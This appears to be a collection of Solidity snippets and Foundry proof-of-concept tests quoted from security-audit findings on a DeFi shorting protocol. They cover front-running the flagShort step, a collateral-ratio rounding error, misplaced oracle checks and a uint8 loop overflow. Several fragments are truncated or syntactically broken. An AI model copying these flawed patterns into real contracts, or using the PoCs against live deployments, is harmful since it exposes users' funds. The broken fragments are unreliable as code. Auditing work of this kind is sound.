"```\nfunction testWithdrawETHfromRocketPool() public {\n    string memory MAINNET_RPC_URL = vm.envString(""MAINNET_RPC_URL"");\n    uint256 mainnetFork = vm.createFork(MAINNET_RPC_URL, 15361748);\n\n    RocketTokenRETHInterface rEth = RocketTokenRETHInterface(0xae78736Cd615f374D3085123A210448E74Fc6393);\n    vm.selectFork(mainnetFork);\n\n    uint totalCollateral = rEth.getTotalCollateral();\n    assertEq(totalCollateral, 0); // pools are empty\n\n    address owner = 0x50A78DFb9F5CC22ac8ffA90FA2B6C595881CCb97; // has rEth at block 15361748\n    uint rEthBalance = rEth.balanceOf(owner);\n    assertGt(rEthBalance, 0);\n\n    vm.expectRevert(""Insufficient ETH balance for exchange"");\n    vm.prank(owner);\n    rEth.burn(rEthBalance);\n}\n```"
"```\nfunction flagShort(\n    address asset,\n    address shorter,\n    uint8 id,\n    uint16 flaggerHint\n)\n    external\n    isNotFrozen(asset)\n    nonReentrant\n    onlyValidShortRecord(asset, shorter, id)\n{\n    short.setFlagger(cusd, flaggerHint);\n    emit Events.FlagShort(\n        asset,\n        shorter,\n        id,\n        msg.sender,\n        adjustedTimestamp\n    );\n}\n```\n```\nfunction _canLiquidate(\n    MTypes.MarginCallPrimary memory m\n) private view returns (bool) {\n    uint256 timeDiff = LibOrders.getOffsetTimeHours() - m.short.updatedAt;\n    uint256 resetLiquidationTime = LibAsset.resetLiquidationTime(m.asset);\n\n    if (timeDiff >= resetLiquidationTime) {\n        return false;\n    } else {\n        uint256 secondLiquidationTime = LibAsset.secondLiquidationTime(m.asset);\n        bool isBetweenFirstAndSecondLiquidationTime = \n            timeDiff > LibAsset.firstLiquidationTime(m.asset) \n            && timeDiff <= secondLiquidationTime \n            && s.flagMapping[m.short.flaggerId] == msg.sender;\n        bool isBetweenSecondAndResetLiquidationTime = \n            timeDiff > secondLiquidationTime \n            && timeDiff <= resetLiquidationTime;\n        if (\n           !(\n                (isBetweenFirstAndSecondLiquidationTime) \n                || (isBetweenSecondAndResetLiquidationTime)\n            )\n        ) {\n            revert Errors.MarginCallIneligibleWindow();\n        }\n\n        return true;\n    }\n}\n```\n```\nfunction fillShortRecord(\n    address asset,\n    address shorter,\n    uint8 shortId,\n    SR status,\n    uint88 collateral,\n    uint88 ercAmount,\n    uint256 ercDebtRate,\n    uint256 zethYieldRate\n) internal {\n    AppStorage storage s = appStorage();\n\n    uint256 ercDebtSocialized = ercAmount.mul(ercDebtRate);\n    uint256 yield = collateral.mul(zethYieldRate);\n\n    STypes.ShortRecord storage short = s.shortRecords[asset][shorter][shortId];\n    if (short.status == SR.Cancelled) {\n        short.ercDebt = short.collateral = 0;\n    }\n\n    short.status = status;\n    LibShortRecord.merge(\n        short,\n        ercAmount,\n        ercDebtSocialized,\n        collateral,\n        yield,\n        LibOrders.getOffsetTimeHours()\n    );\n}\n```\n```\nfunction merge(\n    STypes.ShortRecord storage short,\n    uint88 ercDebt,\n    uint256 ercDebtSocialized,\n    uint88 collateral,\n    uint256 yield,\n    uint24 creationTime\n) internal {\n    ercDebtSocialized += short.ercDebt.mul(short.ercDebtRate);\n    short.ercDebt += ercDebt;\n    short.ercDebtRate = ercDebtSocialized.divU64(short.ercDebt);\n\n    yield += short.collateral.mul(short.zethYieldRate);\n    short.collateral += collateral;\n    short.zethYieldRate = yield.divU80(short.collateral);\n\n    short.updatedAt = creationTime;\n}\n```"
"```\nfunction _setInitialMargin(address asset, uint16 value) private {\n    require(value > 100, ""below 1.0"");\n    s.asset[asset].initialMargin = value;\n    require(LibAsset.initialMargin(asset) < Constants.CRATIO_MAX, ""above max CR"");\n}\n\nfunction _setPrimaryLiquidationCR(address asset, uint16 value) private {\n    require(value > 100, ""below 1.0"");\n    require(value <= 500, ""above 5.0"");\n    require(value < s.asset[asset].initialMargin, ""above initial margin"");\n    s.asset[asset].primaryLiquidationCR = value;\n}\n\nfunction _setSecondaryLiquidationCR(address asset, uint16 value) private {\n    require(value > 100, ""below 1.0"");\n    require(value <= 500, ""above 5.0"");\n    require(value < s.asset[asset].primaryLiquidationCR, ""above primary liquidation"");\n    s.asset[asset].secondaryLiquidationCR = value;\n}\n```\nfunction _setForcedBidPriceBuffer(address asset, uint8 value) private {\n    require(value >= 100, ""below 1.0"");\n    require(value <= 200, ""above 2.0"");\n    s.asset[asset].forcedBidPriceBuffer = value;\n}\n\nfunction _setMinimumCR(address asset, uint8 value) private {\n    require(value >= 100, ""below 1.0"");\n    require(value <= 200, ""above 2.0"");\n    s.asset[asset].minimumCR = value;\n    require(LibAsset.minimumCR(asset) < LibAsset.secondaryLiquidationCR(asset), ""above secondary liquidation"");\n}\n```"
"```\n(uint80 baseRoundID,\n    int256 basePrice,\n    uint256 baseTimeStamp\n) = baseOracle.latestRoundData();\n```"
"```\nfunction test_audit_frontrunFlagShort() public {\n    address alice = makeAddr(""Alice""); // Alice will front-run Bob's attempt to flag her short\n    address aliceSecondAddr = makeAddr(""AliceSecondAddr"");\n    address bob = makeAddr(""Bob""); // Bob will try to flag Alice's short\n    address randomUser = makeAddr(""randomUser""); // regular user who created a bid order\n\n    // A random user create a bid, Alice create a short, which will match with the user's bid\n    fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, randomUser);\n    fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, alice);\n    // Alice then mint the NFT associated to the SR so that it can be transferred\n    vm.prank(alice);\n    diamond.mintNFT(asset, Constants.SHORT_STARTING_ID);\n\n    // ETH price drops from 4000 to 2666, making Alice's short flaggable because its < LibAsset.primaryLiquidationCR(asset)\n    setETH(2666 ether);\n\n    // Alice saw Bob's attempt to flag her short, so she front-runs him and transfers the SR\n    vm.prank(alice);\n    diamond.transferFrom(alice, aliceSecondAddr, 1);\n\n    // Bob's attempt reverts because the transfer of the short by Alice changes the short status to SR.Cancelled\n    vm.prank(bob);\n    vm.expectRevert(Errors.InvalidShortId.selector);\n    diamond.flagShort(asset, alice, Constants.SHORT_STARTING_ID, Constants.HEAD);\n}\n```\n```\nfunction test_audit_frontrunPreventFlagAndSecondaryLiquidation() public {\n    address alice = makeAddr(""Alice""); // Alice will front-run Bob's attempt to flag her short\n    address aliceSecondAddr = makeAddr(""AliceSecondAddr"");\n    address aliceThirdAddr = makeAddr(""AliceThirdAddr"");\n    address bob = makeAddr(""Bob""); // Bob will try to flag Alice's short\n    address randomUser = makeAddr(""randomUser""); // regular user who created a bid order\n\n    fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, randomUser);\n    fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, alice);\n    vm.prank(alice);\n    diamond.mintNFT(asset, Constants.SHORT_STARTING_ID);\n\n    setETH(700 ether);\n\n    vm.prank(alice);\n    diamond.transferFrom(alice, aliceSecondAddr, 1);\n    vm.prank(bob);\n    vm.expectRevert(Errors.InvalidShortId.selector);\n    diamond.flagShort(asset, alice, Constants.SHORT_STARTING_ID, Constants.HEAD);\n\n    vm.prank(aliceSecondAddr);\n    diamond.transferFrom(aliceSecondAddr, aliceThirdAddr, 1);\n\n    vm.prank(aliceSecondAddr);\n    STypes.ShortRecord memory shortRecord = getShortRecord(aliceSecondAddr, Constants.SHORT_STARTING_ID);\n    depositUsd(bob, shortRecord.ercDebt);\n    vm.expectRevert(Errors.MarginCallSecondaryNoValidShorts.selector);\n    liquidateErcEscrowed(aliceSecondAddr, Constants.SHORT_STARTING_ID, DEFAULT_AMOUNT, bob);\n}\n```"
"```\nfunction transferShortRecord(\n    address asset,\n    address from,\n    address to,\n    uint40 tokenId,\n    STypes.NFT memory nft\n) internal {\n    AppStorage storage s = appStorage();\n    STypes.ShortRecord storage short = s.shortRecords[asset][from][nft.shortRecordId];\n    if (short.status == SR.Cancelled) {\n        revert Errors.OriginalShortRecordCancelled();\n    }\n    if (short.flaggerId!= 0) {\n        revert Errors.CannotTransferFlaggedShort();\n    }\n    deleteShortRecord(asset, from, nft.shortRecordId);\n    uint8 id = createShortRecord(\n        asset,\n        to,\n        SR.FullyFilled,\n        short.collateral,\n        short.ercDebt,\n        short.ercDebtRate,\n        short.zethYieldRate,\n        tokenId\n    );\n    if (id == Constants.SHORT_MAX_ID) {\n        revert Errors.ReceiverExceededShortRecordLimit();\n    }\n    s.nftMapping[tokenId].owner = to;\n    s.nftMapping[tokenId].shortRecordId = id;\n}\n```"
"```\nfunction withdraw(address bridge, uint88 zethAmount)\n    external\n    nonReentrant\n    onlyValidBridge(bridge)\n{\n    if (zethAmount == 0) revert Errors.ParameterIsZero();\n    uint88 fee;\n    uint256 withdrawalFee = bridge.withdrawalFee();\n    uint256 vault;\n    if (bridge == rethBridge || bridge == stethBridge) {\n        vault = Vault.CARBON;\n    } else {\n        vault = s.bridge[bridge].vault;\n    }\n    if (withdrawalFee > 0) {\n        fee = zethAmount.mulU88(withdrawalFee);\n        zethAmount -= fee;\n        s.vaultUser[vault][address(this)].ethEscrowed += fee;\n    }\n    uint88 ethAmount = _ethConversion(vault, zethAmount);\n    vault.removeZeth(zethAmount, fee);\n    IBridge(bridge).withdraw(msg.sender, ethAmount);\n    emit Events.Withdraw(bridge, msg.sender, zethAmount, fee);\n}\n\nfunction _ethConversion(uint256 vault, uint88 amount) private view returns (uint88) {\n    uint256 zethTotalNew = vault.getZethTotal();\n    uint88 zethTotal = s.vault[vault].zethTotal;\n    if (zethTotalNew >= zethTotal) {\n        return amount;\n    } else {\n        return amount.mulU88(zethTotalNew).divU88(zethTotal);\n    }\n}\n```"
```\nuint88 shares = eth * (timeTillMatch / 1) / days;\n```
```\nfunction shutdownMarket(address asset)\n    external\n    onlyValidAsset(asset)\n    isNotFrozen(asset)\n    nonReentrant\n{\n    uint256 cRatio = _getAssetCollateralRatio(asset);\n    if (cRatio > LibAsset.minimumCR(asset)) {\n        revert Errors.SufficientCollateral();\n    } else {\n        STypes.Asset storage Asset = s.asset[asset];\n        uint256 vault = Asset.vault;\n        uint88 assetZethCollateral = Asset.zethCollateral;\n        s.vault[vault].zethCollateral -= assetZethCollateral;\n        Asset.frozen = F.Permanent;\n        if (cRatio > 1 ether) {\n            uint88 excessZeth = assetZethCollateral - assetZethCollateral.divU88(cRatio);\n            s.vaultUser[vault][address(this)].ethEscrowed += excessZeth;\n            // Reduces c-ratio to 1\n            Asset.zethCollateral -= excessZeth;\n        }\n    }\n    emit Events.ShutdownMarket(asset);\n}\n\nfunction _getAssetCollateralRatio(address asset)\n    private\n    view\n    returns (uint256 cRatio)\n{\n    STypes.Asset storage Asset = s.asset[asset];\n    return Asset.zethCollateral.div(LibOracle.getPrice(asset).mul(Asset.ercDebt));\n}\n```
```\nMarket status:\n    assetX: current price 100\n```
```\nfunction _marginFeeHandler(MTypes.MarginCallPrimary memory m) private {\n    STypes.VaultUser storage VaultUser = s.vaultUser[m.vault][msg.sender];\n    STypes.VaultUser storage TAPP = s.vaultUser[m.vault][address(this)];\n\n    uint88 tappFee = m.ethFilled.mulU88(m.tappFeePct);\n    uint88 callerFee = m.ethFilled.mulU88(m.callerFeePct) + m.gasFee;\n    m.totalFee += tappFee + callerFee;\n\n    if (TAPP.ethEscrowed >= callerFee) {\n        TAPP.ethEscrowed -= callerFee;\n        VaultUser.ethEscrowed += callerFee;\n    } else {\n        VaultUser.ethEscrowed += callerFee - m.gasFee + tappFee;\n        m.totalFee -= m.gasFee;\n        // TAPP.ethEscrowed -= m.totalFee; ❌\n    }\n}\n```
"```\nfunction setFlagger(\n    STypes.ShortRecord storage short,\n    address cusd,\n    uint16 flaggerHint\n) internal {\n    if (flagStorage.g_flaggerId == 0) {\n        address flaggerToReplace = s.flagMapping[flaggerHint];\n\n        if (flaggerToReplace!= address(0)) {\n            uint256 timeDiff = LibOrders.getOffsetTimeHours()\n                - s.assetUser[cusd][flaggerToReplace].g_updatedAt;\n            if (timeDiff > LibAsset.firstLiquidationTime(cusd)) {\n                delete s.assetUser[cusd][flaggerToReplace].g_flaggerId;\n                short.flaggerId = flagStorage.g_flaggerId = flaggerHint;\n            }\n        }\n        s.flagMapping[short.flaggerId] = msg.sender;\n    }\n```\n```\ndiff --git a/test/MarginCallFlagShort.t.sol b/test/MarginCallFlagShort.t.sol\nindex 906657e..3d7f985 100644\n--- a/test/MarginCallFlagShort.t.sol\nb/test/MarginCallFlagShort.t.sol\n@@ -169,6 @@ contract MarginCallFlagShortTest is MarginCallHelper {\n         assertEq(diamond.getFlagger(shortRecord.flaggerId), extra);\n     }\n\n    function test_FlaggerId_Override_Before_Call() public {\n        address flagger1 = address(77);\n        address flagger2 = address(78);\n        vm.label(flagger1, ""flagger1"");\n        vm.label(flagger2, ""flagger2"");\n\n        // Create first short\n        fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);\n        fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, sender);\n        STypes.ShortRecord memory shortRecord1 = diamond.getShortRecord(asset, sender, Constants.SHORT_STARTING_ID);\n        assertEq(diamond.getFlaggerIdCounter(), 1);\n        assertEq(shortRecord1.flaggerId, 0);\n        assertEq(diamond.getFlagger(shortRecord1.flaggerId), address(0));\n\n        // Flag first short\n        setETH(2500 ether);\n        vm.prank(flagger1);\n        diamond.flagShort(asset, sender, shortRecord1.id, Constants.HEAD);\n        shortRecord1 = diamond.getShortRecord(asset, sender, shortRecord1.id);\n        assertEq(diamond.getFlaggerIdCounter(), 2);\n        assertEq(shortRecord1.flaggerId, 1);\n        assertEq(diamond.getFlagger(shortRecord1.flaggerId), flagger1);\n\n        skip(TEN_HRS_PLUS);\n        setETH(2500 ether);\n\n        // Attempting direct liquidation by flagger2 fails since only allowed to flagger1\n        // Add ask order to liquidate against\n        fundLimitAskOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);\n        uint16[] memory shortHintArray = setShortHintArray();\n        vm.prank(flagger2);\n        vm.expectRevert(Errors.MarginCallIneligibleWindow.selector);\n        diamond.liquidate(asset, sender, shortRecord1.id, shortHintArray);\n\n        // Cancel the previously created ask order\n        fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);\n\n        // Reset\n        setETH(4000 ether);\n\n        // Create another short"
"```\n{\n    uint88 currentShortCollateral = currentShort.collateral;\n    uint88 currentShortErcDebt = currentShort.ercDebt;\n    collateral += currentShortCollateral;\n    ercDebt += currentShortErcDebt;\n    yield += currentShortCollateral.mul(currentShort.zethYieldRate);\n    ercDebtSocialized += currentShortErcDebt.mul(currentShort.ercDebtRate);\n}\n```\n```\nfirstShort.merge(\n    ercDebt,\n    ercDebtSocialized,\n    collateral,\n    yield,\n    c.shortUpdatedAt\n)\n```\nif (c.shortFlagExists) {\n    if (\n        firstShort.getCollateralRatioSpotPrice(\n            LibOracle.getSavedOrSpotOraclePrice(_asset)\n        ) < LibAsset.primaryLiquidationCR(_asset)\n    ) {\n        revert Errors.InsufficientCollateral();\n    }\n    // Resulting combined short has sufficient c-ratio to remove flag\n    firstShort.resetFlag();\n}\n```"
"```\nfunction liquidateSecondary(\n    address asset,\n    MTypes.BatchMC[] memory batches,\n    uint88 liquidateAmount,\n    bool isWallet\n) external \n    onlyValidAsset(asset)\n    isNotFrozen(asset)\n    nonReentrant \n{\n    emit Events.LiquidateSecondary(asset, batches, msg.sender, isWallet);\n}\n```"
"```\nFile: contracts/libraries/LibOracle.sol\n\n85 uint256 twapPriceInEther = (twapPrice / Constants.DECIMAL_USDC) * 1 ether;\n86 uint256 twapPriceInv = twapPriceInEther;\n\n87 if (twapPriceInEther == 0) {\n88     revert Errors.InvalidTwapPrice();\n89 }\n```\n```\npragma solidity 0.8.21;\n\nimport {Constants} from ""contracts/libraries/Constants.sol"";\nimport {Errors} from ""contracts/libraries/Errors.sol"";\nimport {U256} from ""contracts/libraries/PRBMathHelper.sol"";\nimport {OBFixture} from ""test/utils/OBFixture.sol"";\n\ncontract InvalidTwapPriceErrorCheck is OBFixture {\n    using U256 for uint256;\n\n    function getZeroTwapPriceInEther_IncorrectStyle_As_In_Existing_DittoProtocol()\n        internal\n        pure\n        returns (uint256 twapPriceInEther, uint256 twapPriceInv)\n    {\n        uint256 twapPrice = 0;\n        twapPriceInEther = (twapPrice / Constants.DECIMAL_USDC) * 1 ether;\n        twapPriceInv = twapPriceInEther.inv();\n        if (twapPriceInEther == 0) {\n            revert Errors.InvalidTwapPrice();\n        }\n    }\n\n    function getZeroTwapPriceInEther_CorrectStyle()\n        internal\n        pure\n        returns (uint256 twapPriceInEther, uint256 twapPriceInv)\n    {\n        uint256 twapPrice = 0;\n        twapPriceInEther = (twapPrice / Constants.DECIMAL_USDC) * 1 ether;\n        if (twapPriceInEther == 0) {\n            revert Errors.InvalidTwapPrice();\n        }\n        twapPriceInv = twapPriceInEther.inv();\n    }\n\n    function testInvalidTwapPriceErrNeverInvoked() public pure {\n        getZeroTwapPriceInEther_IncorrectStyle_As_In_Existing_DittoProtocol();\n    }\n\n    function testInvalidTwapPriceErrInvokedCorrectly() public {\n        vm.expectRevert(Errors.InvalidTwapPrice.selector);\n        getZeroTwapPriceInEther_CorrectStyle();\n    }\n}"
"```\nuint256 cRatio = \n    short.getCollateralRatioSpotPrice(LibOracle.getSavedOrSpotOraclePrice(asset));\n```\n```\nuint256 oraclePrice = LibOracle.getOraclePrice(asset);\n\nuint256 cRatio = short.getCollateralRatioSpotPrice(oraclePrice);\n```\n```\nfunction getOraclePrice(address asset) internal view returns (uint256) {\n    AppStorage storage s = appStorage();\n    AggregatorV3Interface baseOracle = AggregatorV3Interface(s.baseOracle);\n    uint256 protocolPrice = getPrice(asset);\n\n    (uint80 baseRoundID,\n        int256 basePrice,\n        //,\n        uint256 baseTimeStamp,\n        //,\n        uint80 baseAnsweredInRound\n    ) = baseOracle.latestRoundData();\n\n    AggregatorV3Interface oracle = AggregatorV3Interface(s.asset[asset].oracle);\n    if (address(oracle) == address(0)) revert Errors.InvalidAsset();\n\n    if (oracle == baseOracle) {\n        uint256 basePriceInEth = basePrice > 0\n           ? uint256(basePrice * Constants.BASE_ORACLE_DECIMALS).inv()\n            : 0;\n        basePriceInEth = baseOracleCircuitBreaker(\n            protocolPrice, baseRoundID, basePrice, baseTimeStamp, basePriceInEth\n        );\n        return basePriceInEth;\n    } else {\n        (uint80 roundID,\n            int256 price,\n            //,\n            uint256 timeStamp,\n            //,\n            uint80 answeredInRound\n        ) = oracle.latestRoundData();\n        uint256 priceInEth = uint256(price).div(uint256(basePrice));\n        oracleCircuitBreaker(\n            roundID, baseRoundID, price, basePrice, timeStamp, baseTimeStamp\n        );\n        return priceInEth;\n    }\n}\n```\n```\nfunction getSavedOrSpotOraclePrice(address asset) internal view returns (uint256) {\n    if (LibOrders.getOffsetTime() - getTime(asset) < 15 minutes) {\n        return getPrice(asset);\n    } else {\n        return getOraclePrice(asset);\n    }\n}\n```\n```\nfunction getCollateralRatioSpotPrice(\n    STypes.ShortRecord memory short,\n    uint256 oraclePrice\n) internal pure returns (uint256 cRatio) {\n    return short.collateral.div(short.ercDebt.mul(oraclePrice));\n}\n```\n```\nif (\n    short.getCollateralRatioSpotPrice(LibOracle.getSavedOrSpotOraclePrice(asset)) \n    < LibAsset.primaryLiquidationCR(asset)\n)\n```\nshortCollateral / (shortErcDebt * (oracleN / oracleD))\n```\n```\n(shortCollateral * oracleD) / (shortErcDebt * oracleN)\n```\nuint256 private short_collateral = 100361729669569000000; // ~ 100 ether\nuint256 private short_ercDebt = 100000000000000000000000; // 100_000 ether\nuint256 private price = 99995505; // oracleN\nuint256 private basePrice = 199270190598; // oracleD\nuint256 private primaryLiquidationCR = 2000000000000000000; // 2 ether (as on forked mainnet)\n\nuint256 private calculatedPriceInEth = price / basePrice; // ~ 0.0005 ether\n```\n```\nif (\n    short.getCollateralRatioSpotPrice(LibOracle.getSavedOrSpotOraclePrice(asset)) \n    >= LibAsset.primaryLiquidationCR(asset)\n) {\n    revert Errors.SufficientCollateral();\n}\n```\n```\npragma solidity 0.8.21;\n\nimport { U256 } from ""contracts/libraries/PRBMathHelper.sol"";\nimport { OBFixture } from ""test/utils/OBFixture.sol"";\nimport { console } from ""contracts/libraries/console.sol"";\n\ncontract IncorrectCRatioCheck is OBFixture {\n    using U256 for uint256;\n\n    uint256 private short_collateral = 85307470219133700000; // ~ 85.3 ether\n    uint256 private short_ercDebt = 100000000000000000000000; // 100_000 ether\n    uint256 private price = 99995505; // oracleN\n    uint256 private basePrice = 199270190598; // (as on forked mainnet)  // oracleD\n    uint256 private primaryLiquidationCR = 1700000000000000000; // 1.7 ether (as on forked mainnet)\n\n    function _getSavedOrSpotOraclePrice() internal view returns (uint256) {\n        uint256 priceInEth = price.div(basePrice);\n        return priceInEth; // will return 501808648347845 =~ 0.0005 ether  // (as on forked mainnet)\n    }\n\n    function getCollateralRatioSpotPrice_IncorrectStyle_As_In_Existing_DittoProtocol(\n        uint256 oraclePrice\n    ) internal view returns (uint256) {\n        return short_collateral.div(short_ercDebt.mul(oraclePrice));\n    }\n\n    function getCollateralRatioSpotPrice_CorrectStyle(uint256 oracleN, uint256 oracleD)\n        internal\n        view\n        returns (uint256)\n    {\n        return (short_collateral.mul(oracleD)).div(short_ercDebt.mul(oracleN));\n    }\n\n    function test_GetCollateralRatioSpotPrice_IncorrectStyle_As_In_Existing_DittoProtocol()\n        public\n        view\n    {\n        uint256 cRatio = getCollateralRatioSpotPrice_IncorrectStyle_As_In_Existing_DittoProtocol(\n            _getSavedOrSpotOraclePrice()\n        );\n        console.log(""cRatio calculated (existing style) ="", cRatio);\n        if (cRatio >= primaryLiquidationCR) {\n            console.log(""Errors.SufficientCollateral; can not be flagged"");\n        } else {\n            console.log(""InsufficientCollateral; can be flagged"");\n        }\n    }\n\n    function test_GetCollateralRatioSpotPrice_CorrectStyle()\n        public\n```\nLogs:\n    cRatio calculated (existing style) = 1700000000000000996\n    Errors.SufficientCollateral; can not be flagged\n```\n```\nLogs:\n    cRatio calculated (correct style) = 1699999999999899995\n    InsufficientCollateral; can be flagged\n```"
```\nfunction _canLiquidate(MTypes.MarginCallPrimary memory m)\n    private\n    view\n    returns (bool)\n{\n    uint256 timeDiff = LibOrders.getOffsetTimeHours() - m.short.updatedAt;\n    uint256 resetLiquidationTime = LibAsset.resetLiquidationTime(m.asset);\n\n    if (timeDiff >= resetLiquidationTime) {\n        return false;\n    } else {\n        uint256 secondLiquidationTime = LibAsset.secondLiquidationTime(m.asset);\n        bool isBetweenFirstAndSecondLiquidationTime = timeDiff > LibAsset.firstLiquidationTime(m.asset) &&\n            timeDiff <= secondLiquidationTime &&\n            s.flagMapping[m.short.flaggerId] == msg.sender;\n        bool isBetweenSecondAndResetLiquidationTime = timeDiff > secondLiquidationTime &&\n            timeDiff <= resetLiquidationTime;\n\n        if (\n           !(isBetweenFirstAndSecondLiquidationTime || isBetweenSecondAndResetLiquidationTime)\n        ) {\n            revert Errors.MarginCallIneligibleWindow();\n        }\n        return true;\n    }\n}\n```\n```\nif (timeDiff <= resetLiquidationTime):\n    revert Errors.MarginCallAlreadyFlagged()\n```
"```\nfunction _claimYield(uint256 vault, uint88 yield, uint256 dittoYieldShares) private {\n    STypes.Vault storage Vault = s.vault[vault];\n    STypes.VaultUser storage VaultUser = s.vaultUser[vault][msg.sender];\n\n    if (yield <= 1) {\n        revert Errors.NoYield();\n    }\n\n    VaultUser.ethEscrowed += yield;\n\n    uint256 protocolTime = LibOrders.getOffsetTime();\n    uint256 dittoRewardShortersTotal = Vault.dittoShorterRate * protocolTime;\n    uint256 dittoYieldSharesTotal = Vault.zethCollateralReward;\n    uint256 dittoReward = dittoYieldShares.mul(dittoRewardShortersTotal).div(dittoYieldSharesTotal);\n\n    if (dittoReward > type(uint80).max) {\n        revert Errors.InvalidAmount();\n    }\n\n    VaultUser.dittoReward += uint80(dittoReward);\n}\n```\n```\nfunction testYieldRateChange() public {\n    address alice = makeAddr(""alice"");\n    address bob = makeAddr(""bob"");\n    address[] memory assets = new address[](1);\n    assets[0] = asset;\n\n    fundLimitBid(DEFAULT_PRICE, 320000 ether, receiver);\n    fundLimitShort(DEFAULT_PRICE, 80000 ether, alice);\n    fundLimitShort(DEFAULT_PRICE, 80000 ether, bob);\n    generateYield();\n    skip(yieldEligibleTime);\n\n    assertEq(diamond.getDittoMatchedReward(vault, alice), diamond.getDittoMatchedReward(vault, alice));\n\n    vm.prank(alice);\n    diamond.distributeYield(assets);\n\n    vm.prank(owner);\n    diamond.setDittoShorterRate(vault, 2);\n\n    vm.prank(bob);\n    diamond.distributeYield(assets);\n\n    uint256 aliceDittoRewards = diamond.getDittoReward(vault, alice);\n    uint256 bobDittoRewards = diamond.getDittoReward(vault, bob);\n\n    assertApproxEqAbs(aliceDittoRewards * 2, bobDittoRewards, 2);\n}\n```"
"```\nfunction liquidate(\n    address asset,\n    address shorter,\n    uint8 id,\n    uint16[] memory shortHintArray\n)\n    external\n    isNotFrozen(asset)\n    nonReentrant\n    onlyValidShortRecord(asset, shorter, id)\n    returns (uint88, uint88)\n{\n    // rest of code\n}\n```\n```\n(m.ethFilled, ercAmountLeft) = IDiamond(\n    payable(address(this))).createForcedBid(\n    address(this), m.asset, _bidPrice, m.short.ercDebt, shortHintArray\n)\n```\nfunction _updateOracleAndStartingShort(address asset, uint16[] memory shortHintArray)\n    private\n{\n    uint16 shortHintId;\n    for (uint256 i = 0; i < shortHintArray.length; i++) {\n        shortHintId = shortHintArray[i];\n        unchecked {\n            i++;\n        }\n\n        {\n            O shortOrderType = s.shorts[asset][shortHintId].orderType;\n            if (\n                shortOrderType == O.Cancelled || shortOrderType == O.Matched\n                    || shortOrderType == O.Uninitialized\n            ) {\n                continue;\n            }\n        }\n    }\n}\n```\nfunction _marginFeeHandler(MTypes.MarginCallPrimary memory m) private {\n    STypes.VaultUser storage VaultUser = s.vaultUser[m.vault][msg.sender];\n    STypes.VaultUser storage TAPP = s.vaultUser[m.vault][address(this)];\n\n    uint88 tappFee = m.ethFilled.mulU88(m.tappFeePct);\n    uint88 callerFee = m.ethFilled.mulU88(m.callerFeePct) + m.gasFee;\n\n    m.totalFee += tappFee + callerFee;\n\n    if (TAPP.ethEscrowed >= callerFee) {\n        TAPP.ethEscrowed -= callerFee;\n        VaultUser.ethEscrowed += callerFee;\n    } else {\n        VaultUser.ethEscrowed += callerFee - m.gasFee + tappFee;\n        m.totalFee -= m.gasFee;\n        TAPP.ethEscrowed -= m.totalFee;\n    }\n}\n```"
```\nuint24 flaggerIdCounter;\n```\n```\nelse if (s.flaggerIdCounter < type(uint16).max) {\n    short.flaggerId = flagStorage.g_flaggerId = s.flaggerIdCounter;\n    s.flaggerIdCounter++;\n} else {\n    revert Errors.InvalidFlaggerHint();\n}\n```
"```\nif (s.asset[asset].orderId < 65000) {\n    revert Errors.OrderIdCountTooLow();\n}\n```\nif (numOrdersToCancel > 1000) {\n    revert Errors.CannotCancelMoreThan1000Orders();\n}\n```\nfunction cancelManyOrders(\n    mapping(address => mapping(uint16 => STypes.Order)) storage orders,\n    address asset,\n    uint16 lastOrderId,\n    uint16 numOrdersToCancel\n) internal {\n    uint16 prevId;\n    uint16 currentId = lastOrderId;\n    for (uint8 i = 0; i < numOrdersToCancel;) {\n        prevId = orders[asset][currentId].prevId;\n        LibOrders.cancelOrder(orders, asset, currentId);\n        currentId = prevId;\n        unchecked {\n            i++;\n        }\n    }\n}\n```\n```\nunchecked {\n    ++i;\n}\n```\n```\npragma solidity 0.8.0;\n\ncontract PoC {\n    uint256 public iterationsCount;\n\n    function infiniteForLoop(uint256 amountOfIterations) public {\n        for (uint8 i = 0; i < amountOfIterations; ) {\n            iterationsCount += 1;\n            unchecked {\n                ++i;\n            }\n        }\n    }\n}\n```"
"```\nfunction findOrderHintId(\n    mapping(address => mapping(uint16 => STypes.Order)) storage orders,\n    address asset,\n    MTypes.OrderHint[] memory orderHintArray\n) internal returns (uint16 hintId) {\n    if (hintOrderType == O.Cancelled || hintOrderType == O.Matched) {\n        emit Events.FindOrderHintId(0);\n        continue;\n    } else if (\n        orders[asset][orderHint.hintId].creationTime == orderHint.creationTime\n    ) {\n        emit Events.FindOrderHintId(1);\n        return orderHint.hintId;\n    } else if (orders[asset][orderHint.hintId].prevOrderType == O.Matched) {\n        emit Events.FindOrderHintId(2);\n        return Constants.HEAD;\n    }\n}"
"```\nfunction getSavedOrSpotOraclePrice(address asset) internal view returns (uint256) {\n    if (LibOrders.getOffsetTime() - getTime(asset) < 15 minutes) {\n        return getPrice(asset);\n    } else {\n        return getOraclePrice(asset);\n    }\n}\n```\nfunction _secondaryLiquidationHelper(MTypes.MarginCallSecondary memory m) private {\n    m.liquidatorCollateral = m.short.collateral;\n    if (m.cRatio > 1 ether) {\n        uint88 ercDebtAtOraclePrice = m.short.ercDebt.mulU88(LibOracle.getPrice(m.asset)); // eth\n        m.liquidatorCollateral = ercDebtAtOraclePrice;\n        if (m.cRatio > m.minimumCR) {\n            address remainingCollateralAddress = m.shorter;\n            s.vaultUser[m.vault][remainingCollateralAddress].ethEscrowed +=\n                m.short.collateral - ercDebtAtOraclePrice;\n        } else {\n            address remainingCollateralAddress = address(this);\n            s.vaultUser[m.vault][remainingCollateralAddress].ethEscrowed +=\n                m.short.collateral - ercDebtAtOraclePrice;\n        }\n    }\n    LibShortRecord.disburseCollateral(\n        m.asset,\n        m.shorter,\n        m.short.collateral,\n        m.short.zethYieldRate,\n        m.short.updatedAt\n    );\n    LibShortRecord.deleteShortRecord(m.asset, m.shorter, m.short.id);\n}\n```"
